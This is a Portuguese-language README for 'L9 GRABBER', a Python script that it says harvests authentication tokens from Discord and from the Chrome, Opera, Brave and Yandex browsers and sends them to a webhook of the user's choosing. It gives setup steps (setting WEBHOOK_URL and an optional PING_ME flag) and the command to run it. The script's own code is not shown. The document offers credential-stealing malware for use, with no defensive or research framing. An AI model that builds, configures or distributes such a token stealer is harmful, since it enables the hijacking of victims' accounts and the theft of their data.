# L9 GRABBER

Este é um script em Python que procura e coleta tokens de autenticação de diferentes plataformas, como Discord, Google Chrome, Opera, Brave, e Yandex. Os tokens encontrados são então enviados para um webhook especificado.

## Requisitos

Certifique-se de ter o Python instalado em seu sistema. Você pode baixar a versão mais recente do Python em [python.org](https://www.python.org/).

## Configuração

1. Clone ou faça o download deste repositório em seu computador.

2. Abra o arquivo `main.py` em um editor de texto.

3. Substitua `'URL_DO_WEBHOOK_AQUI'` na linha `WEBHOOK_URL = 'URL_DO_WEBHOOK_AQUI'` com a URL do seu webhook.

4. Opcional: Se desejar ser mencionado quando um token for encontrado, defina `PING_ME` como `True` na linha `PING_ME = False`.

## Execução

Abra um terminal ou prompt de comando e navegue até o diretório onde o script está localizado. Execute o seguinte comando:

```bash
python main.py
